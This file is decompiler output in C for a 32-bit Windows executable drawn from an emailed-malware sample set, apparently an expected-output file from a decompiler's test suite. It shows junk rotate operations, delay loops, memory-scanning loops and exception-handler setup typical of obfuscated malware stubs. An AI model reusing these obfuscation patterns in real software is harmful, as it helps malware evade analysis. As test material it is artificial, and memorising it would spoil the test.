// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_1199/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

void fn004010DB(word32 edx, word32 ebx, word32 esi, word32 edi, Eq_8 * fs)
{
	fn004010FF(edx, ebx, esi, edi, fs, dwLoc04);
	return;
}

void fn004010FF(word32 edx, word32 ebx, word32 esi, word32 edi, Eq_8 * fs, word32 dwArg00)
{
	word16 si_11 = __rol(si, 0x0B);
	word32 esi_13 = DPB(esi, si_11, 0, 16);
	int32 eax_17 = (word32) (word16) ebx;
	int32 edi_22 = 0x0000F63C;
	do
		edi_22 = edi_22 - 0x00000001;
	while (eax_17 != edi_22);
	Mem0[0x00401053:word32]();
	word32 esi_52 = __rol(esi_13, 0x16);
	word16 si_53 = (word16) esi_52;
	int32 eax_58 = -eax_17;
	if (dwArg00->b0007 != 0x90)
		return;
	else
	{
		__rol(eax_58, 0x0C);
		word32 edi_105 = Mem0[DPB(0x001235F4, (word16) fp, 0, 16):word32];
		__rol(DPB(esi_52, si_53 | 0x006B | 0x001E, 0, 16) + eax_58, 0x19);
		word32 eax_113 = globals->dw4010D5;
		__rol(fp, 0x01);
		int32 esi_109 = 0x004010C7;
		do
		{
			edi_105 = edi_105 + 1;
			word32 edx_128 = edi_105->dw0000 - eax_113;
			esi_109 = -(esi_109 + 0x464AF8A5);
			word16 dx_129 = (word16) edx_128;
		} while (edx_128 != 0x00000000);
		__rol(esi_109, 0x14);
		__ror(dx_129, 0x01);
		Eq_94 * edx_158 = fp->ptrFFFFFFFC;
		word32 esi_160 = 0x0040102E;
		word32 eax_163 = globals->dw40102E;
		word32 edi_170 = edx_158->dw0000;
		edx_158 = edx_158 + 1;
		esi_160 = __rol(esi_160, 0x03);
		while ((edi_170 ^ eax_163) != 0x00000000)
		{
			edi_170 = edx_158->dw0000;
			edx_158 = edx_158 + 1;
			esi_160 = __rol(esi_160, 0x03);
		}
		fs->dw0000 = fp - 0x0000000C;
		__rol((word16) (fp - 0x0000000C), 0x0A);
		return;
	}
}

